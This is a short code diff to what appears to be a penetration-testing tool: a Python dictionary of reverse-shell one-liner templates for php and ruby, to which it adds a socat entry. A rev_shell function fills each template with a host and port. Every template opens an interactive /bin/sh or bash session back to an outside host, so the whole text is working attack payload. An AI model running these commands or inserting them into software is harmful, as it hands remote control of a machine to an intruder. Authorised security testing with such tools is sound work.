@@ -30,7 +30,9 @@ rev_shells = {
 	"php":
 		"""php -r '$sock=fsockopen("{}",{});exec("/bin/sh -i <&3 >&3 2>&3");'""",
 	"ruby":
-		"""ruby -rsocket -e'f=TCPSocket.open("{}",{}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'"""
+		"""ruby -rsocket -e'f=TCPSocket.open("{}",{}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'""",
+	"socat":
+		"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{}:{}"
 }
 
 def rev_shell(host, port, typ):
